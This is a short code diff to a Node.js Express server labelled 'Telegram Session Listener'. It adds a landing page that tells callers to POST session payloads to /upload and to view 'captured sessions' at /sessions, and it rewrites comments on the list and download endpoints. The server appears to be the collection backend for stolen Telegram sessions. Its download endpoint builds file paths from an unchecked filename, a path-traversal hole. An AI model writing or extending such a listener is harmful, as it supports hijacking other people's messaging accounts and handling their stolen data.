@@ -13,6 +13,17 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 const DATA_DIR = path.join(__dirname, 'sessions');
 fs.ensureDirSync(DATA_DIR);
 
+// Root endpoint – confirms service is live
+app.get('/', (req, res) => {
+    res.send(`
+        <h1>Telegram Session Listener</h1>
+        <p>Service is running.</p>
+        <p>POST to <code>/upload</code> with JSON payload to store a session.</p>
+        <p>GET <a href="/sessions">/sessions</a> to list captured sessions.</p>
+    `);
+});
+
+// Upload endpoint – receives session data
 app.post('/upload', async (req, res) => {
     try {
         const payload = req.body;
@@ -30,7 +41,7 @@ app.post('/upload', async (req, res) => {
     }
 });
 
-// Optional: simple list endpoint to view captured sessions
+// List all captured sessions
 app.get('/sessions', async (req, res) => {
     try {
         const files = await fs.readdir(DATA_DIR);
@@ -41,7 +52,7 @@ app.get('/sessions', async (req, res) => {
     }
 });
 
-// Optional: download a specific session
+// Download a specific session file
 app.get('/download/:filename', async (req, res) => {
     try {
         const filepath = path.join(DATA_DIR, req.params.filename);
